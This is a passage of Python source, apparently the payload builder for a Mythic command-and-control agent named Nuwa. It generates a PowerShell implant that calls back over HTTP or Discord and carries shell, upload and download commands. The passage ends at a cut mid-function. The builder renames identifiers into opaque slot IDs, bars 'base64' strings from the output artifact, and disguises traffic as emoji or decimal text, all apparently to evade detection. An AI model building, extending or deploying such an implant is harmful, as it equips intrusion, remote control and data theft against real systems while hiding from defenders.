from __future__ import annotations

import base64
import binascii
import json
import pathlib
import re
from collections.abc import Mapping, Sequence
from dataclasses import dataclass, field
from datetime import date
from enum import Enum
from types import SimpleNamespace
from typing import Any
from urllib.parse import urlsplit

from .control_identifiers_v3 import (
    ResolvedControlProfile, load_default_profile, resolve_control_profile,
)


try:
    from mythic_container.PayloadBuilder import (
        BuildParameter,
        BuildParameterType,
        BuildResponse,
        BuildStatus,
        BuildStep,
        C2ParameterDeviation,
        HideCondition,
        HideConditionOperand,
        PayloadType,
        SupportedOS,
    )
except ImportError:  # pragma: no cover - local unit test fallback
    class SupportedOS:
        Windows = "Windows"

    class BuildParameterType:
        String = "String"
        Number = "Number"
        Boolean = "Boolean"
        Dictionary = "Dictionary"
        ChooseOne = "ChooseOne"
        File = "File"

    class HideConditionOperand(str, Enum):
        IN = "in"

    @dataclass
    class HideCondition:
        name: str
        operand: HideConditionOperand
        value: Any = None
        choices: list[str] | None = None

    @dataclass
    class BuildParameter:
        name: str
        parameter_type: str
        description: str = ""
        default_value: Any = None
        required: bool = False
        choices: list[str] | None = None
        hide_conditions: list[HideCondition] | None = None

    class BuildStatus:
        Success = "success"
        Error = "error"

    @dataclass
    class BuildResponse:
        status: str
        payload: bytes = b""
        build_message: str = ""
        build_stderr: str = ""
        build_stdout: str = ""

        def set_status(self, status: str) -> None:
            self.status = status

    @dataclass
    class BuildStep:
        step_name: str
        step_description: str

    class C2ParameterDeviation:
        def __init__(
            self,
            supported: bool,
            choices: list[str] | None = None,
            dictionary_choices: list[Any] | None = None,
            default_value: Any = None,
            **kwargs: Any,
        ) -> None:
            self.Supported = supported
            self.Choices = choices
            self.DictionaryChoices = dictionary_choices
            self.DefaultValue = default_value

    class PayloadType:
        uuid: str = ""
        c2info: list[Any] = []
        commands: Any = None
        selected_os: str = SupportedOS.Windows
        _parameter_values: dict[str, Any]

        def __init__(self, *args, **kwargs):
            self._parameter_values = {}
            self.commands = SimpleNamespace(get_commands=lambda: [])

        def get_parameter(self, name: str) -> Any:
            for parameter in getattr(self, "build_parameters", []):
                if parameter.name == name and name not in self._parameter_values:
                    return parameter.default_value
            return self._parameter_values.get(name)


AGENT_ROOT = pathlib.Path(__file__).resolve().parents[2]
AGENT_CODE_ROOT = AGENT_ROOT / "agent_code"
BASE_CODE_ROOT = AGENT_CODE_ROOT / "base"
CODEC_ROOT = AGENT_CODE_ROOT / "codecs"
CLM_CODEC_ROOT = CODEC_ROOT / "clm"
COMMAND_ROOT = AGENT_CODE_ROOT / "commands"
SOCKS_ROOT = AGENT_CODE_ROOT / "socks"
PROFILE_ROOT = AGENT_CODE_ROOT / "profiles"
FRAMING_ROOT = AGENT_CODE_ROOT / "framing"
DISCORD_PROFILE_ROOT = PROFILE_ROOT / "discordx"
TRANSPORT_ENVELOPE_ROOT = AGENT_CODE_ROOT / "transport_envelope"
TRANSPORT_ENVELOPE_FORMAT_ROOT = TRANSPORT_ENVELOPE_ROOT / "formats"
TRANSPORT_ENVELOPE_FRAMING_ROOT = TRANSPORT_ENVELOPE_ROOT / "framing"
TRANSPORT_ENVELOPE_PRESENTATION_ROOT = TRANSPORT_ENVELOPE_ROOT / "presentations"
TRANSPORT_ENVELOPE_PROTECTION_ROOT = TRANSPORT_ENVELOPE_ROOT / "protections"
TRANSPORT_ENVELOPE_KEY_MODE_ROOT = TRANSPORT_ENVELOPE_ROOT / "key_modes"
TRANSPORT_ENVELOPE_CARRIER_ROOT = TRANSPORT_ENVELOPE_ROOT / "carriers"
PROTECTION_ROOT = AGENT_CODE_ROOT / "protection"
PROTECTION_PROFILE_ROOT = PROTECTION_ROOT / "profiles"
CLM_PROTECTION_ROOT = PROTECTION_ROOT / "clm"
CLM_PROTECTION_PROFILE_ROOT = CLM_PROTECTION_ROOT / "profiles"
STAGING_ROOT = AGENT_CODE_ROOT / "staging"
AGENT_MESSAGE_SCHEMA_V2 = json.loads(
    pathlib.Path(__file__).with_name("agent_message_schema_v2.json").read_text(encoding="utf-8")
)
AGENT_DIAGNOSTIC_CATALOG_V2 = {
    entry["text"]: entry["code"]
    for entry in json.loads(
        pathlib.Path(__file__).with_name("agent_diagnostics_v2.json").read_text(encoding="utf-8")
    )["diagnostics"]
}
PROFILE_CODES = AGENT_MESSAGE_SCHEMA_V2["profiles"]
SOCKS_PRIVATE_SLOT_NAMES = tuple(
    "ActivePost AddressType Attempts AwaitingHeartbeatAck Batch BotId BufferedBytes Bulk "
    "Cleanup CleanupAt CleanupBulkDenied CleanupBulkFailures CleanupFailures CleanupTask "
    "CleanupTimestamps Client Complete ConnectStartedAt ConnectTask Connections Consumed "
    "Content Deadline Document Due Epoch Error FailedBatchIds FirstOutboundAt Handle "
    "HeartbeatMilliseconds Host Http Id Ids Initial LastActivity LastMessageId "
    "LastOutboundAt NextHeartbeatAt Outbound Pending Port Ports ReadBuffer ReadTask "
    "Ready ReceiveBuffer ReceiveParts ReceiveTask ReplyCode RequireHeartbeatAck ResumeUrl "
    "Runspace SeenBatchIds SeenBatchOrder SeenMessageOrder SeenMessages Sequence ServerId "
    "Servers SessionId Shared State Stop Stream Task Worker WriteQueue WriteTask"
    .split()
)
SOCKS_PRIVATE_SLOT_IDS = {name: index for index, name in enumerate(SOCKS_PRIVATE_SLOT_NAMES, 1)}
CODEC_PRIVATE_SLOT_IDS = {"Buffer": 1, "Bytes": 2, "Offset": 3, "Key": 4, "Item": 5}
RESPONSE_PRIVATE_SLOT_IDS = {"Json": 1, "WireBody": 2, "WireBytes": 3, "Uuid": 4, "Decoded": 5}
RUNTIME_MODE_CODES = {"full-language": 1, "constrained-language": 2}
FRAMING_MODE_CODES = {"legacy": 0, "raw": 1}
UNUSED_V2_CONFIG_SETTINGS = (
    "CodecProfile", "TransportEnvelopeFormat", "TransportPresentation",
    "TransportProtection", "TransportKeyMode", "TransportNonceStrategy",
    "DiscordProviderKind", "DiscordListenerId",
)
DEFAULT_COMMANDS = ["sleep", "cd", "whoami", "hostname", "exit", "ls", "shell", "upload", "download"]
POWERSHELL_CODEC_PROFILES = ("binary-v1", "binary-v2")
FORBIDDEN_RAW_ARTIFACT_PATTERN = re.compile(
    rb"(?:base64|(?<![0-9a-f])b64(?![0-9a-f]))",
    re.IGNORECASE,
)
PROTECTION_NONE = "none"
PROTECTION_XOR_V1 = "nuwa_xor_v1"
PROTECTION_HMAC_SHA256_V1 = "nuwa_hmac_sha256_v1"
PROTECTION_AES256_HMAC_V1 = "nuwa_aes256_hmac_v1"
PROTECTED_PROFILES = (
    PROTECTION_XOR_V1,
    PROTECTION_HMAC_SHA256_V1,
    PROTECTION_AES256_HMAC_V1,
)
PROTECTION_CHOICES = (PROTECTION_NONE, *PROTECTED_PROFILES)
LEGACY_UNVERSIONED_PROTECTION = "aes256_hmac"
POWERSHELL_RUNTIME_FULL = "full-language"
POWERSHELL_RUNTIME_CONSTRAINED = "constrained-language"
POWERSHELL_RUNTIME_CHOICES = (
    POWERSHELL_RUNTIME_FULL,
    POWERSHELL_RUNTIME_CONSTRAINED,
)
DISCORD_TRANSPORT_FORMATS = ("json-v1", "binary-v1")
TRANSPORT_PRESENTATIONS = ("plain", "base64", "decimal", "emoji")
HTTP_TRANSPORT_PRESENTATIONS = ("decimal", "emoji")
TRANSPORT_PROTECTIONS = (
    "none",
    "xor-obfuscation-v1",
    "chacha20-v1",
    "aes256-hmac-v1",
)
TRANSPORT_KEY_MODES = ("single", "directional")
HTTP_TRANSPORT_NONCE_STRATEGIES = ("profile-default", "random")
DEFAULT_DISCORD_USER_AGENT = "DiscordBot (https://github.com/discord-net/Discord.Net, v3.20.1)"


@dataclass(frozen=True)
class SelectedC2Profile:
    name: str
    parameters: dict[str, Any]


@dataclass(frozen=True)
class ProtectionSelection:
    profile: str
    key: bytes | None = field(repr=False)


@dataclass(frozen=True)
class TransportEnvelopeSelection:
    enabled: bool
    envelope_format: str
    presentation: str
    protection: str
    key_mode: str
    nonce_strategy: str | None
    key: bytes | None = field(repr=False)

    @property
    def legacy(self) -> bool:
        return not self.enabled


class InvalidPayloadOptions(ValueError):
    """One or more payload selections cannot produce a valid Nuwa artifact."""

    def __init__(self, errors: Sequence[str]):
        unique_errors = tuple(dict.fromkeys(str(error) for error in errors if str(error)))
        if not unique_errors:
            unique_errors = ("payload option validation failed",)
        self.errors = unique_errors
        super().__init__(
            "Invalid Nuwa payload options:\n- " + "\n- ".join(unique_errors)
        )


@dataclass(frozen=True)
class PayloadOptionSelection:
    c2_profile_name: str
    codec_profile: str
    debug_logging: bool
    require_https: bool
    powershell_runtime: str
    command_names: tuple[str, ...]
    framing_mode: str
    protection: ProtectionSelection
    exchange_enabled: bool
    staging_enabled: bool
    transport_envelope: TransportEnvelopeSelection


def _read_text(path: pathlib.Path) -> str:
    return path.read_text(encoding="utf-8").strip() + "\n"


def _ps_literal(value: Any) -> str:
    if isinstance(value, bool):
        return "$true" if value else "$false"
    if value is None:
        return "$null"
    if isinstance(value, (int, float)):
        return str(value)
    if isinstance(value, (list, tuple)):
        return "@(" + ", ".join(_ps_literal(item) for item in value) + ")"
    text = str(value).replace('`', '``').replace('$', '`$').replace('"', '`"')
    return f'"{text}"'


def _ps_hashtable(mapping: dict[str, Any], *, indent: str = "    ") -> str:
    lines = ["@{"]
    for key, value in mapping.items():
        if isinstance(value, dict):
            rendered = _ps_hashtable(value, indent=indent + "    ")
            lines.append(f'{indent}"{key}" = {rendered}')
        else:
            lines.append(f'{indent}"{key}" = {_ps_literal(value)}')
    lines.append("}")
    return "\n".join(lines)


def _ps_byte_array(value: bytes) -> str:
    return "[byte[]]@(" + ", ".join(str(item) for item in value) + ")"


def _render_v3_schema(profile: ResolvedControlProfile) -> str:
    prefixes = {
        "fields": "F", "actions": "A", "commands": "C", "statuses": "S",
        "host_values": "H", "profiles": "P", "parameter_fields": "Q", "socks_actions": "V",
    }
    lines = ["# Payload-selected Nuwa v3 control identifiers."]
    for namespace, prefix in prefixes.items():
        for name, value in profile.namespaces[namespace].items():
            variable = re.sub(r"[^A-Za-z0-9]", "_", name)
            lines.append(f"$script:Nuwa{prefix}_{variable} = {_ps_literal(value)}")
    for name, value in profile.namespaces["primitive_tags"].items():
        lines.append(f"$script:NuwaV3Tag_{name} = {_ps_literal(value)}")
    for name, value in profile.namespaces["marker_bytes"].items():
        lines.append(f"$script:NuwaV3Marker_{name} = {_ps_literal(value)}")
    for name, value in profile.namespaces["diagnostic_header"].items():
        lines.append(f"$script:NuwaV3DiagHeader_{name} = {_ps_literal(value)}")
    for name, value in profile.namespaces["diagnostic_positions"].items():
        lines.append(f"$script:NuwaV3DiagPos_{name} = {_ps_literal(value)}")
    return "\n".join(lines) + "\n"


def _adapt_v3_runtime_source(source: str) -> str:
    """Retain quantity casts while allowing profile-selected string IDs."""
    for old, new in (
        ("[int]$Action", "[object]$Action"),
        ("[int]$CommandName", "[object]$CommandName"),
        ("$commandCode = [int]$Task[$script:NuwaF_command]", "$commandCode = $Task[$script:NuwaF_command]"),
        ("[int]$response[$script:NuwaF_status]", "$response[$script:NuwaF_status]"),
        ("$whoami -is [int] -and ", ""),
        ("$hostname -is [int] -and ", ""),
        ("[int]$profileCode", "$profileCode"),
        ("[int]$body[$script:NuwaF_action]", "$body[$script:NuwaF_action]"),
        ("[int]$script:NuwaConfig[$script:NuwaL_C2Profile]", "$script:NuwaConfig[$script:NuwaL_C2Profile]"),
        ("[int]$script:NuwaConfig[$script:NuwaL_PowerShellRuntime]", "$script:NuwaConfig[$script:NuwaL_PowerShellRuntime]"),
        ("[int]$script:NuwaConfig[$script:NuwaL_TransportMessageFormat]", "$script:NuwaConfig[$script:NuwaL_TransportMessageFormat]"),
        ("$diagnostic[0] -is [int] -and $diagnostic[0] -eq 20053",
         "$diagnostic[$script:NuwaV3DiagPos_tag] -eq $script:NuwaV3DiagHeader_tag"),
        ("$diagnostic[1] -is [int] -and $diagnostic[1] -eq 1",
         "$diagnostic[$script:NuwaV3DiagPos_version] -eq $script:NuwaV3DiagHeader_version"),
    ):
        source = source.replace(old, new)
    return source


# Append-only local slots. IDs 0-34 are the frozen values in the literal
# decision register; new slots start at 35.
LOCAL_SLOT_NAMES = (
    "BotChannel", "C2Profile", "CallbackHost", "CallbackInterval",
    "CallbackJitter", "CallbackPort", "CodecProfile", "CurrentDirectory",
    "DiscordApiOrigin", "DiscordApiVersion", "DiscordCdnOrigin",
    "DiscordGatewayOrigin", "DiscordListenerId", "DiscordProviderKind",
    "DiscordToken", "DiscordUserAgent", "ExitRequested", "Headers",
    "Killdate", "MasterKey", "MessageChecks", "MessageUuidLength",
    "PayloadUUID", "PostUri", "PowerShellRuntime", "ProxyHost",
    "ProxyPort", "TimeBetweenChecks", "TransportEnvelopeEnabled",
    "TransportEnvelopeFormat", "TransportKeyMode", "TransportMessageFormat",
    "TransportNonceStrategy", "TransportPresentation", "TransportProtection",
    "CallbackUUID", "ProxyUser", "ProxyPass", "SocksChannel",
    "ProtectionProfile",
)
LOCAL_SLOT_IDS = {name: index for index, name in enumerate(LOCAL_SLOT_NAMES)}
CRYPTO_SLOT_NAMES = (
    "OuterUuid", "Key", "ClmAesKey", "ClmAesRoundKeys",
    "ClmAesRoundWords", "ClmAesDecryptRoundWords", "ClmHmacKey",
    "ClmHmacInnerPad", "ClmHmacOuterPad",
)
CRYPTO_SLOT_IDS = {name: index for index, name in enumerate(CRYPTO_SLOT_NAMES)}


def _control_ids(profile: ResolvedControlProfile | None, namespace: str, defaults: dict[str, int]) -> dict[str, int | str]:
    return dict(profile.namespaces[namespace]) if profile is not None and profile.kind == "binary-v3" else defaults


def _ps_empty_local_slots(profile: ResolvedControlProfile | None = None) -> str:
    ids = _control_ids(profile, "local_slots", LOCAL_SLOT_IDS)
    return "@{}" if any(isinstance(value, str) for value in ids.values()) else f"[object[]]::new({len(LOCAL_SLOT_NAMES)})"


def _ps_empty_crypto_slots(profile: ResolvedControlProfile | None = None) -> str:
    ids = _control_ids(profile, "crypto_slots", CRYPTO_SLOT_IDS)
    return "@{}" if any(isinstance(value, str) for value in ids.values()) else f"[object[]]::new({len(CRYPTO_SLOT_NAMES)})"


def _render_numeric_local_initialization(config: dict[str, Any], profile: ResolvedControlProfile | None = None) -> list[str]:
    unknown = set(config) - set(LOCAL_SLOT_IDS)
    if unknown:
        raise ValueError(f"Unregistered Nuwa local slot(s): {sorted(unknown)}")
    constants = "\n".join(
        f"$script:NuwaL_{name} = {_ps_literal(identifier)}"
        for name, identifier in _control_ids(profile, "local_slots", LOCAL_SLOT_IDS).items()
    )
    constants += "\n" + "\n".join(
        f"$script:NuwaM_{name.replace('-', '_')} = {_ps_literal(identifier)}"
        for name, identifier in _control_ids(profile, "runtime_modes", RUNTIME_MODE_CODES).items()
    )
    constants += "\n" + "\n".join(
        f"$script:NuwaF_{name} = {_ps_literal(identifier)}"
        for name, identifier in _control_ids(profile, "framing_modes", FRAMING_MODE_CODES).items()
    )
    constants += "\n" + "\n".join(
        f"$script:NuwaK_{name} = {_ps_literal(identifier)}"
        for name, identifier in _control_ids(profile, "crypto_slots", CRYPTO_SLOT_IDS).items()
    )
    constants += "\n" + "\n".join(
        f"$script:NuwaE_{name} = {_ps_literal(identifier)}"
        for name, identifier in _control_ids(profile, "response_private_slots", RESPONSE_PRIVATE_SLOT_IDS).items()
    )
    config_lines = ["$script:NuwaConfig = " + _ps_empty_local_slots(profile)]
    for name, value in config.items():
        rendered = (
            str(PROTECTION_CHOICES.index(value)) if name == "ProtectionProfile"
            else _ps_hashtable(value) if isinstance(value, dict) else _ps_literal(value)
        )
        config_lines.append(f"$script:NuwaConfig[$script:NuwaL_{name}] = {rendered}")
    state_lines = [
        "$script:NuwaState = " + _ps_empty_local_slots(profile),
        "$script:NuwaState[$script:NuwaL_CurrentDirectory] = (Get-Location).Path",
        "$script:NuwaState[$script:NuwaL_ExitRequested] = $false",
    ]
    return [constants, "\n".join(config_lines), "\n".join(state_lines)]


def _replace_numeric_local_accesses(source: str, profile: ResolvedControlProfile | None = None) -> str:
    pattern = re.compile(r"\$script:Nuwa(Config|State)\.([A-Za-z][A-Za-z0-9]*)")

    def replace(match: re.Match[str]) -> str:
        name = match.group(2)
        if name in LOCAL_SLOT_IDS:
            return f"$script:Nuwa{match.group(1)}[$script:NuwaL_{name}]"
        if name == "ContainsKey":
            return match.group(0)
        raise ValueError(f"Unregistered Nuwa local access: {match.group(0)}")

    source = pattern.sub(replace, source)
    crypto_pattern = re.compile(r"\$script:NuwaCryptoState\.([A-Za-z][A-Za-z0-9]*)")

    def replace_crypto(match: re.Match[str]) -> str:
        name = match.group(1)
        if name not in CRYPTO_SLOT_IDS:
            raise ValueError(f"Unregistered Nuwa crypto slot: {name}")
        return f"$script:NuwaCryptoState[$script:NuwaK_{name}]"

    source = crypto_pattern.sub(replace_crypto, source)
    parameter_names = set(AGENT_MESSAGE_SCHEMA_V2["parameter_fields"])
    parameter_pattern = re.compile(r"\$Parameters\.([a-z][a-z0-9_]*)")

    def replace_parameter(match: re.Match[str]) -> str:
        name = match.group(1)
        if name not in parameter_names:
            raise ValueError(f"Unregistered Nuwa task parameter: {match.group(0)}")
        return f"$Parameters[$script:NuwaQ_{name}]"

    source = source.replace("$Parameters.ContainsKey('jitter')", "$Parameters.ContainsKey($script:NuwaQ_jitter)")
    source = parameter_pattern.sub(replace_parameter, source)
    source = source.replace(
        "$script:NuwaCryptoState = @{}",
        "$script:NuwaCryptoState = " + _ps_empty_crypto_slots(profile),
    )
    source = source.replace(
        "$script:NuwaTransportEnvelopeState.MasterKey",
        "$script:NuwaTransportEnvelopeState[$script:NuwaL_MasterKey]",
    )
    return source.replace(
        "$script:NuwaConfig.ContainsKey('C2Profile')",
        "$script:NuwaConfig.ContainsKey($script:NuwaL_C2Profile)",
    )


def _render_numeric_codec_module(path: pathlib.Path, profile: ResolvedControlProfile | None = None) -> str:
    source = _read_text(path)
    if profile is not None and profile.kind == "binary-v3":
        # Keep only the bounded byte/varint/float helpers. The v3 module below
        # supplies the selected tags, map encoding, and runtime entry points.
        source = re.sub(
            r"(?ms)^function Add-NuwaBinaryValue \{.*?(?=^function Read-NuwaBinaryBytes \{)",
            "", source, count=1,
        )
        source = re.sub(
            r"(?ms)^function Read-NuwaBinaryValue \{.*?(?=^# NUWA_SRC_END|\Z)",
            "", source, count=1,
        )
    names = "|".join(CODEC_PRIVATE_SLOT_IDS)
    bare = re.compile(rf"(?m)(^[ \t]*|[;{{][ \t]*)({names})(?=[ \t]*=)")
    slot_cast = "" if profile is not None and profile.kind == "binary-v3" else "[int]"
    source = bare.sub(lambda match: f"{match.group(1)}({slot_cast}$script:NuwaB_{match.group(2)})", source)
    members = re.compile(r"\$(State|minimum|candidate|entry)\.(Buffer|Bytes|Offset|Key|Item)\b", re.IGNORECASE)
    source = members.sub(
        lambda match: f"${match.group(1)}[$script:NuwaB_{next(name for name in CODEC_PRIVATE_SLOT_IDS if name.lower() == match.group(2).lower())}]",
        source,
    )
    source = re.sub(
        r"(\$entries\[\$cursor\])\.Key\b",
        r"\1[$script:NuwaB_Key]",
        source,
    )
    assignments = "\n".join(
        f"$script:NuwaB_{name} = {_ps_literal(identifier)}"
        for name, identifier in _control_ids(profile, "codec_private_slots", CODEC_PRIVATE_SLOT_IDS).items()
    )
    return assignments + "\n" + source


def _replace_v2_private_response_records(source: str, profile: ResolvedControlProfile | None = None) -> str:
    names = "|".join(RESPONSE_PRIVATE_SLOT_IDS)
    bare = re.compile(rf"(?m)(^[ \t]*|[;{{][ \t]*)({names})(?=[ \t]*=)")
    slot_cast = "" if profile is not None and profile.kind == "binary-v3" else "[int]"
    source = bare.sub(lambda match: f"{match.group(1)}({slot_cast}$script:NuwaE_{match.group(2)})", source)
    members = re.compile(
        rf"\$(framingCandidate|resolved|resolvedBody)\.({names})\b",
        re.IGNORECASE,
    )
    return members.sub(
        lambda match: f"${match.group(1)}[$script:NuwaE_{next(name for name in RESPONSE_PRIVATE_SLOT_IDS if name.lower() == match.group(2).lower())}]",
        source,
    )


def _remove_v2_test_entropy_hook(source: str) -> str:
    return re.sub(
        r"(?m)^    if \(\$null -ne \$Context -and \$Context\.ContainsKey\('entropy_bytes'\)\) \{\n"
        r"(?:.*\n){3}    \}\n",
        "",
        source,
    )


def _render_numeric_protection_module(path: pathlib.Path) -> str:
    source = _read_text(path)
    # Selection was resolved by the builder; the returned profile name has no reader.
    return re.sub(
        r"(?ms)^function Get-NuwaProtectionProfileName \{\n.*?^\}\n\n",
        "",
        source,
        count=1,
    )


def _crypto_field(value: Any, *names: str) -> Any:
    if isinstance(value, dict):
        for name in names:
            if name in value:
                return value[name]
        lowered = {str(key).lower(): item for key, item in value.items()}
        for name in names:
            if name.lower() in lowered:
                return lowered[name.lower()]
        return None

    for name in names:
        if hasattr(value, name):
            return getattr(value, name)
    return None


def _key_material_is_present(value: Any) -> bool:
    return value is not None and value != "" and value != b""


def _decode_crypto_key(value: Any, *, field_name: str) -> bytes:
    if isinstance(value, bytes):
        decoded = value
    elif isinstance(value, str):
        try:
            decoded = base64.b64decode(value, validate=True)
        except (binascii.Error, ValueError) as exc:
            raise ValueError(f"{field_name} key must use strict Base64 encoding") from exc
    else:
        raise ValueError(f"{field_name} key must be a Base64 string or bytes")

    if len(decoded) != 32:
        raise ValueError(f"{field_name} key must decode to exactly one 32-byte key")
    return bytes(decoded)


def _decode_canonical_transport_key(value: Any) -> bytes:
    if not isinstance(value, str):
        raise ValueError("transport_key must use strict Base64 encoding")
    decoded = _decode_crypto_key(value, field_name="transport_key")
    if base64.b64encode(decoded).decode("ascii") != value:
        raise ValueError("transport_key must use canonical strict Base64 encoding")
    return decoded


def _resolve_transport_envelope_selection(
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
) -> TransportEnvelopeSelection:
    """Normalize the fixed listener-owned outer transport selection.

    Absence of all transport parameters preserves pre-feature artifacts. Once
    any parameter is present the complete fixed configuration is validated;
    no value is inferred from channel contents at runtime.
    """
    profile = str(c2_profile_name or "").strip().lower()
    if profile not in {"discordx", "http"}:
        raise ValueError(f"Unsupported Nuwa C2 profile '{profile}'")

    parameter_names = {
        "transport_presentation",
        "transport_envelope_format",
        "transport_protection",
        "transport_key_mode",
        "transport_key",
    }
    if profile == "http":
        parameter_names.add("transport_nonce_strategy")
    configured = any(name in c2_parameters for name in parameter_names)
    legacy_presentation = "legacy-http"
    if not configured:
        if profile == "discordx":
            return TransportEnvelopeSelection(
                enabled=True,
                envelope_format="json-v1",
                presentation="plain",
                protection="none",
                key_mode="single",
                nonce_strategy=None,
                key=None,
            )
        return TransportEnvelopeSelection(
            enabled=False,
            envelope_format="legacy-http",
            presentation=legacy_presentation,
            protection="none",
            key_mode="single",
            nonce_strategy="profile-default" if profile == "http" else None,
            key=None,
        )

    envelope_format = str(c2_parameters.get("transport_envelope_format", "binary-v1")).strip().lower()
    presentation = str(c2_parameters.get(
        "transport_presentation", "plain" if profile == "discordx" else legacy_presentation
    )).strip().lower()
    protection = str(c2_parameters.get("transport_protection", "none")).strip().lower()
    key_mode = str(c2_parameters.get("transport_key_mode", "single")).strip().lower()
    nonce_strategy = None
    if profile == "http":
        nonce_strategy = str(
            c2_parameters.get("transport_nonce_strategy", "profile-default")
        ).strip().lower()
    # Discord's selected protection version owns its nonce or IV construction.
    # Ignore stale saved values from installations that exposed this retired knob.
    key_value = c2_parameters.get("transport_key", "")

    available_presentations = (
        TRANSPORT_PRESENTATIONS
        if profile == "discordx"
        else HTTP_TRANSPORT_PRESENTATIONS
    )
    allowed_presentations = set(available_presentations)
    if profile == "http":
        allowed_presentations.add(legacy_presentation)
    if envelope_format not in DISCORD_TRANSPORT_FORMATS:
        raise ValueError(
            f"transport_envelope_format must be one of {list(DISCORD_TRANSPORT_FORMATS)}"
        )
    if presentation not in allowed_presentations:
        raise ValueError(
            f"transport_presentation must be one of {sorted(allowed_presentations)}"
        )
    if protection not in TRANSPORT_PROTECTIONS:
        raise ValueError(
            f"transport_protection must be one of {list(TRANSPORT_PROTECTIONS)}"
        )
    if key_mode not in TRANSPORT_KEY_MODES:
        raise ValueError("transport_key_mode must be 'single' or 'directional'")
    if profile == "http" and nonce_strategy not in HTTP_TRANSPORT_NONCE_STRATEGIES:
        raise ValueError(
            "transport_nonce_strategy must be 'profile-default' or 'random'"
        )

    is_legacy = profile == "http" and presentation == legacy_presentation
    if is_legacy and protection != "none":
        raise ValueError("legacy transport presentation is valid only with none protection")
    if not is_legacy and presentation not in available_presentations:
        raise ValueError(
            f"protected {profile} transport requires one of "
            f"{list(available_presentations)}"
        )
    if profile == "discordx" and presentation == "plain" and (
        envelope_format != "json-v1" or protection != "none"
    ):
        raise ValueError(
            "plain transport_presentation requires json-v1 and none protection"
        )

    if protection == "none":
        # Mythic can materialize a randomized listener key even when the
        # selected conditional protection is none. It is deliberately
        # discarded and never enters the generated artifact.
        key = None
    else:
        if is_legacy:
            raise ValueError("legacy transport presentation cannot use protection")
        if not _key_material_is_present(key_value):
            raise ValueError(f"{protection} requires a canonical 32-byte transport_key")
        key = _decode_canonical_transport_key(key_value)

    return TransportEnvelopeSelection(
        enabled=not is_legacy,
        envelope_format=envelope_format,
        presentation=presentation,
        protection=protection,
        key_mode=key_mode,
        nonce_strategy=nonce_strategy,
        key=key,
    )


def _resolve_protection_selection(value: Any) -> ProtectionSelection:
    if value is None or value == "":
        return ProtectionSelection(profile=PROTECTION_NONE, key=None)

    if isinstance(value, str):
        profile = value.strip().lower()
        enc_key = None
        dec_key = None
    else:
        profile = str(_crypto_field(value, "value", "Value") or PROTECTION_NONE)
        profile = profile.strip().lower()
        enc_key = _crypto_field(value, "enc_key", "EncKey")
        dec_key = _crypto_field(value, "dec_key", "DecKey")

    has_enc_key = _key_material_is_present(enc_key)
    has_dec_key = _key_material_is_present(dec_key)
    if profile in {PROTECTION_NONE, ""}:
        if has_enc_key or has_dec_key:
            raise ValueError("none protection must not carry key material")
        return ProtectionSelection(profile=PROTECTION_NONE, key=None)

    if profile == LEGACY_UNVERSIONED_PROTECTION:
        if has_enc_key or has_dec_key:
            raise ValueError(
                "unversioned aes256_hmac key material is not valid for a Nuwa build"
            )
        return ProtectionSelection(profile=PROTECTION_NONE, key=None)

    if profile not in PROTECTED_PROFILES:
        raise ValueError(f"unsupported Nuwa protection profile '{profile}'")
    if not has_enc_key or not has_dec_key:
        raise ValueError(f"{profile} requires matching 32-byte encryption and decryption keys")

    decoded_enc_key = _decode_crypto_key(enc_key, field_name="encryption")
    decoded_dec_key = _decode_crypto_key(dec_key, field_name="decryption")
    if decoded_enc_key != decoded_dec_key:
        raise ValueError("Nuwa protection encryption and decryption keys must match")
    return ProtectionSelection(profile=profile, key=decoded_enc_key)


def _coerce_powershell_runtime(value: Any) -> str:
    """Return the canonical build-time PowerShell implementation selection."""
    if isinstance(value, str):
        normalized = value.strip().lower()
        if normalized in POWERSHELL_RUNTIME_CHOICES:
            return normalized
    raise ValueError(
        "powershell_runtime must be 'full-language' or 'constrained-language'"
    )


def _protection_source_paths(
    protection_profile: str,
    powershell_runtime: str,
) -> tuple[pathlib.Path, ...]:
    """Return only the ordered PowerShell source fragments for one backend."""
    runtime = _coerce_powershell_runtime(powershell_runtime)
    if protection_profile not in PROTECTED_PROFILES:
        raise ValueError(f"Unsupported protected profile '{protection_profile}'")

    if runtime == POWERSHELL_RUNTIME_FULL:
        paths = (PROTECTION_PROFILE_ROOT / f"{protection_profile}.ps1",)
    else:
        paths_list = [CLM_PROTECTION_ROOT / "common.ps1"]
        if protection_profile in {
            PROTECTION_HMAC_SHA256_V1,
            PROTECTION_AES256_HMAC_V1,
        }:
            paths_list.append(CLM_PROTECTION_ROOT / "sha256.ps1")
        if protection_profile == PROTECTION_AES256_HMAC_V1:
            paths_list.append(CLM_PROTECTION_ROOT / "aes256.ps1")
        paths_list.append(CLM_PROTECTION_PROFILE_ROOT / f"{protection_profile}.ps1")
        paths = tuple(paths_list)

    for path in paths:
        if not path.is_file():
            raise ValueError(f"Missing PowerShell protection source '{path.name}'")
    return paths


def _staging_source_path(powershell_runtime: str, codec_profile: str = "binary-v1") -> pathlib.Path:
    """Return the one statically selected RSA staging implementation."""
    runtime = _coerce_powershell_runtime(powershell_runtime)
    filename = "rsa_v2.ps1" if codec_profile == "binary-v2" else "rsa.ps1"
    path = STAGING_ROOT / filename if runtime == POWERSHELL_RUNTIME_FULL else STAGING_ROOT / "clm" / filename
    if not path.is_file():
        raise ValueError(f"Missing PowerShell staging source '{path.name}'")
    return path


def _coerce_require_https(value: Any) -> bool:
    if value is None:
        return False
    if isinstance(value, bool):
        return value
    if isinstance(value, str):
        normalized = value.strip().lower()
        if normalized == "true":
            return True
        if normalized == "false":
            return False
    raise ValueError("require_https must be a Boolean true or false value")


def _coerce_encrypted_exchange(c2_profile_name: str, value: Any) -> bool:
    if value is None or value == "":
        return False
    if c2_profile_name == "http":
        if isinstance(value, bool):
            return value
        if isinstance(value, str):
            normalized = value.strip().lower()
            if normalized == "true":
                return True
            if normalized == "false":
                return False
        raise ValueError("HTTP encrypted_exchange_check must be Boolean true or false")
    if c2_profile_name == "discordx":
        if isinstance(value, str):
            normalized = value.strip().upper()
            if normalized == "T":
                return True
            if normalized == "F":
                return False
        raise ValueError("Discord encrypted_exchange_check must be 'T' or 'F'")
    raise ValueError(f"Unsupported Nuwa C2 profile '{c2_profile_name}'")


def _validate_https_policy(
    *,
    c2_profile_name: str,
    c2_parameters: dict[str, Any],
    require_https: bool,
) -> None:
    if not require_https or c2_profile_name == "discordx":
        return
    if c2_profile_name != "http":
        raise ValueError(f"Unsupported Nuwa C2 profile '{c2_profile_name}'")

    callback_host = str(c2_parameters.get("callback_host", "")).strip()
